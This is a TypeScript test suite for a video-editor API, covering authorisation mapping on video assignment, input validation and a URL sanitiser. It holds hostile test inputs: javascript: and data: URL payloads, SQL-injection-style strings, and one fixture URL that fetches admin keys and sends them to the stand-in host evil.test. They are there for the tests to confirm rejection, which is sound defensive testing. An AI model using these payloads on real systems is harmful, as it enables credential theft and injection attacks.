/**
 * The unassigned-video triage routes (api/editor-routes.ts).
 *
 * The case that earns this file is the authorisation mapping on assign. The
 * assign route takes four subject types, while can_edit_videos_for_unit()
 * takes the OWNER type plus a unit id. Passing one vocabulary into the other
 * compiles, reads correctly, and denies every non-admin: 'agenda_entry' hits
 * the function's fall-through and returns false, and 'event' with an event
 * uuid looks that uuid up in events_agenda_entries and finds nothing. Both
 * are invisible while testing as an admin, because is_admin() returns true
 * before either lookup. So the test asserts WHICH check each subject type
 * routes to, not merely that a permitted caller gets through.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { mountEditorRoutes, safeLink, type EditorDeps } from '../api/editor-routes.js';

type Handler = (req: any, res: any) => Promise<void> | void;

/** Collects the handlers so they can be called directly. */
function fakeRouter() {
  const routes = new Map<string, Handler>();
  const add = (method: string) => (path: string, ...rest: unknown[]) => {
    routes.set(`${method} ${path}`, rest[rest.length - 1] as Handler);
  };
  return {
    router: {
      get: add('GET'), post: add('POST'), put: add('PUT'),
      patch: add('PATCH'), delete: add('DELETE'), use: () => {},
    } as any,
    call: async (key: string, req: Record<string, unknown> = {}) => {
      const h = routes.get(key);
      if (!h) throw new Error(`no handler for ${key}; have ${[...routes.keys()].join(', ')}`);
      let status = 200;
      let body: unknown;
      const res = {
        status(code: number) { status = code; return res; },
        json(payload: unknown) { body = payload; return res; },
      };
      await h({ query: {}, params: {}, body: {}, headers: {}, ...req }, res);
      return { status, body: body as any };
    },
    has: (key: string) => routes.has(key),
  };
}

/**
 * A chainable PostgREST stub. Every filter returns itself and records the
 * call, and awaiting it yields whatever the test queued for that table.
 */
function fakeSupabase(results: Record<string, unknown>) {
  const calls: Array<{ table: string; op: string; args: unknown[] }> = [];
  const rpcCalls: Array<{ fn: string; args: unknown }> = [];

  const chain = (table: string) => {
    const result = results[table] ?? { data: [], error: null, count: 0 };
    const self: any = new Proxy({}, {
      get(_t, prop: string) {
        if (prop === 'then') {
          return (resolve: (v: unknown) => unknown) => Promise.resolve(result).then(resolve);
        }
        return (...args: unknown[]) => { calls.push({ table, op: prop, args }); return self; };
      },
    });
    return self;
  };

  return {
    supabase: {
      from: (table: string) => chain(table),
      rpc: (fn: string, args?: unknown) => {
        rpcCalls.push({ fn, args });
        const r = results[`rpc:${fn}`] ?? { data: { ok: true }, error: null };
        return Promise.resolve(r) as any;
      },
      storage: {} as any,
    } as EditorDeps['supabase'],
    calls,
    rpcCalls,
  };
}

const ADMIN = '11111111-1111-1111-1111-111111111111';
const EVENT = '22222222-2222-2222-2222-222222222222';
const ENTRY = '33333333-3333-3333-3333-333333333333';
const VIDEO = '44444444-4444-4444-4444-444444444444';
const PODCAST = '55555555-5555-5555-5555-555555555555';
const EPISODE = '66666666-6666-6666-6666-666666666666';

/**
 * A caller whose permission RPCs all answer `allow`, recording what was asked.
 * `allow` is deliberately applied uniformly: the point is to read back WHICH
 * question the route asked, which a mixed set of answers would obscure.
 */
function fakeCaller(opts: { isAdmin?: boolean; allow?: boolean } = {}) {
  const asked: Array<{ fn: string; args: unknown }> = [];
  const userClient = () => ({
    auth: { getUser: async () => ({ data: { user: { id: ADMIN } } }) },
    rpc: async (fn: string, args?: unknown) => {
      asked.push({ fn, args });
      if (fn === 'is_admin') return { data: opts.isAdmin === true, error: null };
      return { data: opts.allow !== false, error: null };
    },
  });
  return { userClient: userClient as unknown as EditorDeps['userClient'], asked };
}

const logger = { info: () => {}, warn: () => {} };

describe('POST /unassigned/:videoId/assign — which permission check runs', () => {
  const cases: Array<{ type: string; id: string; fn: string; args: unknown }> = [
    // A whole event or podcast is a SUBJECT, so it is the subject check.
    { type: 'event', id: EVENT, fn: 'can_edit_videos_for', args: { p_subject_type: 'event', p_subject_id: EVENT } },
    { type: 'podcast', id: PODCAST, fn: 'can_edit_videos_for', args: { p_subject_type: 'podcast', p_subject_id: PODCAST } },
    // A talk or an episode is a UNIT, and the type passed must be the type of
    // the thing that OWNS it, not the name of the unit.
    { type: 'agenda_entry', id: ENTRY, fn: 'can_edit_videos_for_unit', args: { p_subject_type: 'event', p_unit_id: ENTRY } },
    { type: 'podcast_episode', id: EPISODE, fn: 'can_edit_videos_for_unit', args: { p_subject_type: 'podcast', p_unit_id: EPISODE } },
  ];

  for (const c of cases) {
    it(`${c.type} asks ${c.fn} with the owner type`, async () => {
      const { router, call } = fakeRouter();
      const { supabase, rpcCalls } = fakeSupabase({});
      const caller = fakeCaller();
      mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

      const { status } = await call('POST /unassigned/:videoId/assign', {
        params: { videoId: VIDEO },
        body: { subject_type: c.type, subject_id: c.id },
      });

      expect(status).toBe(200);
      const check = caller.asked.find((a) => a.fn === c.fn);
      expect(check, `expected ${c.fn} to be called, got ${caller.asked.map((a) => a.fn).join(', ')}`)
        .toBeTruthy();
      expect(check!.args).toEqual(c.args);

      // And the subject type is NEVER passed to the unit check as-is, which
      // is the bug this file exists for.
      for (const a of caller.asked.filter((x) => x.fn === 'can_edit_videos_for_unit')) {
        expect((a.args as any).p_subject_type).not.toBe('agenda_entry');
        expect((a.args as any).p_subject_type).not.toBe('podcast_episode');
      }

      // The write goes through the function, not a bare insert.
      expect(rpcCalls.map((r) => r.fn)).toContain('assign_video_subject');
    });
  }

  it('refuses a subject type outside the four', async () => {
    const { router, call } = fakeRouter();
    const { supabase } = fakeSupabase({});
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { status } = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: VIDEO },
      body: { subject_type: 'speaker', subject_id: EVENT },
    });
    expect(status).toBe(400);
  });

  it('refuses ids that are not uuids before asking anything', async () => {
    const { router, call } = fakeRouter();
    const { supabase } = fakeSupabase({});
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const bad = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: 'not-a-uuid' },
      body: { subject_type: 'event', subject_id: EVENT },
    });
    expect(bad.status).toBe(400);

    const badSubject = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: VIDEO },
      body: { subject_type: 'event', subject_id: '1 OR 1=1' },
    });
    expect(badSubject.status).toBe(400);
    expect(caller.asked).toHaveLength(0);
  });

  it('denies when the caller holds nothing for that subject', async () => {
    const { router, call } = fakeRouter();
    const { supabase, rpcCalls } = fakeSupabase({});
    const caller = fakeCaller({ allow: false });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { status } = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: VIDEO },
      body: { subject_type: 'agenda_entry', subject_id: ENTRY },
    });
    expect(status).toBe(403);
    // Nothing was written.
    expect(rpcCalls.map((r) => r.fn)).not.toContain('assign_video_subject');
  });
});

describe('a video that already belongs to something', () => {
  it('is refused, even when the caller may edit where it is going', async () => {
    const { router, call } = fakeRouter();
    // The video already has a link, to a subject this caller knows nothing of.
    const { supabase, rpcCalls } = fakeSupabase({
      video_subjects: { data: [{ subject_type: 'event' }], error: null },
    });
    const caller = fakeCaller({ allow: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { status, body } = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: VIDEO },
      body: { subject_type: 'event', subject_id: EVENT },
    });

    // Without this, a video id — which public-routes.ts hands out
    // unauthenticated — plus a grant on any subject of one's own is enough to
    // detach somebody else's video, because assign_video_subject() deletes
    // the existing link before writing the new one.
    expect(status).toBe(409);
    expect(rpcCalls.map((r) => r.fn)).not.toContain('assign_video_subject');
    // And it does not say which subject holds it.
    expect(JSON.stringify(body)).not.toContain('event');
  });

  it('goes ahead when there is no existing link', async () => {
    const { router, call } = fakeRouter();
    const { supabase, rpcCalls } = fakeSupabase({ video_subjects: { data: [], error: null } });
    const caller = fakeCaller({ allow: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { status } = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: VIDEO },
      body: { subject_type: 'event', subject_id: EVENT },
    });
    expect(status).toBe(200);
    expect(rpcCalls.map((r) => r.fn)).toContain('assign_video_subject');
  });

  it('refuses rather than assuming when the check itself fails', async () => {
    const { router, call } = fakeRouter();
    const { supabase, rpcCalls } = fakeSupabase({
      video_subjects: { data: null, error: { message: 'connection reset' } },
    });
    const caller = fakeCaller({ allow: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { status } = await call('POST /unassigned/:videoId/assign', {
      params: { videoId: VIDEO },
      body: { subject_type: 'event', subject_id: EVENT },
    });
    // An unreadable check must not be read as "unassigned".
    expect(status).toBe(500);
    expect(rpcCalls.map((r) => r.fn)).not.toContain('assign_video_subject');
  });
});

describe('safeLink', () => {
  it('passes http and https through', () => {
    expect(safeLink('https://youtube.com/watch?v=x')).toBe('https://youtube.com/watch?v=x');
    expect(safeLink('http://example.test/a.mp3')).toBe('http://example.test/a.mp3');
    expect(safeLink('HTTPS://EXAMPLE.TEST/a')).toBe('HTTPS://EXAMPLE.TEST/a');
  });

  it('refuses a scheme that would run as script in the admin origin', () => {
    // videos.url is whatever the platform said. Nothing constrains the column,
    // and the admin puts it in an href.
    expect(safeLink('javascript:alert(document.cookie)')).toBeNull();
    expect(safeLink('JavaScript:alert(1)')).toBeNull();
    expect(safeLink('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(safeLink('vbscript:msgbox(1)')).toBeNull();
    // A leading space does not smuggle one past the check.
    expect(safeLink('  javascript:alert(1)')).toBeNull();
  });

  it('refuses a relative or protocol-relative link, which would resolve against the admin', () => {
    expect(safeLink('//evil.test/x')).toBeNull();
    expect(safeLink('/admin/settings')).toBeNull();
  });

  it('treats nothing as nothing', () => {
    expect(safeLink(null)).toBeNull();
    expect(safeLink(undefined)).toBeNull();
    expect(safeLink('')).toBeNull();
    expect(safeLink(42)).toBeNull();
  });
});

describe('GET /unassigned', () => {
  let deps: { router: any; call: any };

  beforeEach(() => { deps = fakeRouter() as any; });

  it('rejects a provider that is not a known platform', async () => {
    const { supabase } = fakeSupabase({});
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(deps.router, { supabase, userClient: caller.userClient, logger });

    const { status, body } = await deps.call('GET /unassigned', {
      query: { provider: 'videos_unassigned; drop table' },
    });
    expect(status).toBe(400);
    expect(body.error).toMatch(/provider/);
  });

  it('accepts every provider the videos table allows', async () => {
    const { supabase } = fakeSupabase({ videos_unassigned: { data: [], error: null, count: 0 } });
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(deps.router, { supabase, userClient: caller.userClient, logger });

    for (const p of ['youtube', 'spotify', 'tiktok', 'instagram', 'linkedin', 'x', 'vimeo', 'apple_podcasts', 'gatewaze']) {
      const { status } = await deps.call('GET /unassigned', { query: { provider: p } });
      expect(status, p).toBe(200);
    }
  });

  it('caps the page size however large a limit is asked for', async () => {
    const { supabase, calls } = fakeSupabase({ videos_unassigned: { data: [], error: null, count: 0 } });
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(deps.router, { supabase, userClient: caller.userClient, logger });

    const { body } = await deps.call('GET /unassigned', { query: { limit: '100000' } });
    expect(body.limit).toBe(200);
    const range = calls.find((c) => c.op === 'range');
    expect(range!.args).toEqual([0, 199]);
  });

  it('strips a dangerous url before the admin ever builds an href from it', async () => {
    const { supabase } = fakeSupabase({
      videos_unassigned: {
        data: [{
          id: VIDEO,
          provider: 'youtube',
          title: 'looks ordinary',
          url: 'javascript:fetch("/api/admin/keys").then(r=>r.text()).then(t=>fetch("//evil.test?"+t))',
          thumbnail_url: 'data:text/html,<script>alert(1)</script>',
        }],
        error: null,
        count: 1,
      },
    });
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(deps.router, { supabase, userClient: caller.userClient, logger });

    const { body } = await deps.call('GET /unassigned');
    expect(body.videos[0].url).toBeNull();
    expect(body.videos[0].thumbnail_url).toBeNull();
    // The rest of the row still comes through.
    expect(body.videos[0].title).toBe('looks ordinary');
  });

  it('refuses a scoped editor, because an unassigned video has no subject to scope by', async () => {
    // No 'all' grant on file.
    const { supabase } = fakeSupabase({ video_editor_grants: { data: [], error: null } });
    const caller = fakeCaller({ isAdmin: false, allow: true });
    mountEditorRoutes(deps.router, { supabase, userClient: caller.userClient, logger });

    const { status } = await deps.call('GET /unassigned');
    expect(status).toBe(403);
  });

  it('lets an editor with an "all" grant in, without being an admin', async () => {
    const { supabase } = fakeSupabase({
      video_editor_grants: { data: [{ subject_type: 'all' }], error: null },
      videos_unassigned: { data: [], error: null, count: 0 },
    });
    const caller = fakeCaller({ isAdmin: false, allow: true });
    mountEditorRoutes(deps.router, { supabase, userClient: caller.userClient, logger });

    const { status } = await deps.call('GET /unassigned');
    expect(status).toBe(200);
  });
});

describe('GET /unassigned/summary', () => {
  it('counts with head requests and owns up to what it could not read', async () => {
    const { router, call } = fakeRouter();
    // One provider's count fails; the rest answer 4 each.
    const chainResults: Record<string, unknown> = {
      videos_unassigned: { data: null, error: null, count: 4 },
    };
    const { supabase } = fakeSupabase(chainResults);
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { status, body } = await call('GET /unassigned/summary');
    expect(status).toBe(200);
    // Nine providers at 4 apiece.
    expect(body.total).toBe(36);
    expect(body.by_provider.youtube).toBe(4);
    // Zero-count providers are left out rather than shown as empty filters.
    expect(Object.values(body.by_provider).every((n) => (n as number) > 0)).toBe(true);
    expect(body.unreadable).toBeUndefined();
  });

  it('names the providers whose count failed, so a short total is not read as the truth', async () => {
    const { router, call } = fakeRouter();
    const { supabase } = fakeSupabase({
      videos_unassigned: { data: null, error: { message: 'statement timeout' }, count: null },
    });
    const caller = fakeCaller({ isAdmin: true });
    mountEditorRoutes(router, { supabase, userClient: caller.userClient, logger });

    const { body } = await call('GET /unassigned/summary');
    expect(body.total).toBe(0);
    expect(body.unreadable).toHaveLength(9);
  });
});
